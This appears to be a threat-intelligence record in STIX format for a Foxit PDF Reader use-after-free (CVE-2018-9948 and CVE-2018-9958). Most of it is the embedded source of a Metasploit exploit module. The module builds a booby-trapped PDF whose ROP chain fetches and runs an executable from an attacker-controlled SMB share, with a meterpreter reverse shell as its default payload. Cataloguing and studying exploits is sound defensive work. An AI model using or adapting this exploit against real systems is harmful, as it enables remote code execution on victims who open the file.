{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be0669e7-c3a7-4c7b-87a5-9352b32105ed",
    "created": "2024-08-14T16:36:09.128152Z",
    "modified": "2024-08-14T16:36:09.128156Z",
    "name": "Foxit PDF Reader Pointer Overwrite UAF",
    "description": " Foxit PDF Reader v9.0.1.1049 has a Use-After-Free vulnerability in the Text Annotations component and the TypedArray's use uninitialized pointers.  The vulnerabilities can be combined to leak a vtable memory address which can be adjusted to point to the base address of the executable. A ROP chain can be constructed that will execute when Foxit Reader performs the UAF.  This module has been tested on Windows 7 x64, Windows 10 Pro x64 Build 17134, and Windows 10 Enterprise x64. Windows 10 Enterprise must have insecure logons enabled for the exploit to work as expected.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/foxit_reader_uaf.rb",
            "external_id": "foxit_reader_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-9948"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-9958"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/cve-2018-99{48,58}.pdf.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Foxit PDF Reader Pointer Overwrite UAF',\n      'Description' => %q{\n        Foxit PDF Reader v9.0.1.1049 has a Use-After-Free vulnerability\n        in the Text Annotations component and the TypedArray's use\n        uninitialized pointers.\n\n        The vulnerabilities can be combined to leak a vtable memory address,\n        which can be adjusted to point to the base address of the executable.\n        A ROP chain can be constructed that will execute when Foxit Reader\n        performs the UAF.\n\n        This module has been tested on Windows 7 x64, Windows 10 Pro x64\n        Build 17134, and Windows 10 Enterprise x64. Windows 10 Enterprise\n        must have insecure logons enabled for the exploit to work as expected.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'mr_me',            # Use-after-free and PoC\n          'bit from meepwn',  # Uninitialized pointer\n          'saelo',            # JavaScript Garbage Collector\n          'Jacob Robles'      # Metasploit Module\n        ],\n      'References' =>\n        [\n          ['CVE', '2018-9948'],\n          ['CVE', '2018-9958'],\n          ['ZDI', '18-332'],\n          ['ZDI', '18-342'],\n          ['URL', 'https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html'],\n          ['URL', 'https://srcincite.io/pocs/cve-2018-99{48,58}.pdf.txt']\n        ],\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => true,\n          'FILENAME' => 'test.pdf',\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          ['Windows 10 Pro x64 Build 17134', {}]\n        ],\n      'DisclosureDate' => '2018-04-20',\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('EXENAME', [false, 'EXE file to download', '']),\n      OptString.new('SHARE', [false, 'SMB share hosting exe', ''])\n    ])\n  end\n\n  def get_pdf\n    share = datastore['SHARE'].empty? ? \"#{Rex::Text.rand_text_alpha_lower(1)}\" : datastore['SHARE']\n    fname = datastore['EXENAME'].empty? ? \"#{Rex::Text.rand_text_alpha_lower(1)}.exe\" : datastore['EXENAME']\n    fname << '.exe' unless fname.ends_with?('.exe')\n\n    share_path = \"\\\\\\\\#{datastore['LHOST']}\\\\#{share}\\\\#{fname}\"\n    num = 4 - (share_path.length % 4)\n    num = 0 if num == 4\n    share_path << \"\\x00\"*num\n    return nil if share_path.length > 44\n\n    print_status(\"share_path: #{share_path}\")\n\n    rop = ''\n    max_index = 0\n    share_path.unpack('V*').each_with_index {|blk, index|\n      rop << \"\\nrop[0x%02x] = 0x%08x;\" % [index+12, blk]\n      max_index = index\n    }\n\n    (max_index+1).upto(10) {|i| rop << \"\\nrop[0x%02x] = 0x00000000;\" % (i+12)}\n\n    begin\n      template = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-9948', 'template.pdf'))\n      pdf_doc = ERB.new(template).result(binding())\n      pdf_doc\n    rescue Errno::ENOENT\n      fail_with(Failure::NotFound, 'The PDF template was not found')\n    end\n  end\n\n  def exploit\n    my_pdf = get_pdf\n    if my_pdf.nil?\n      fail_with(Failure::BadConfig, 'The generated share path was greater than 44 bytes.')\n    end\n    file_create(my_pdf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-20",
    "x_mitre_platforms": [
        "win'"
    ]
}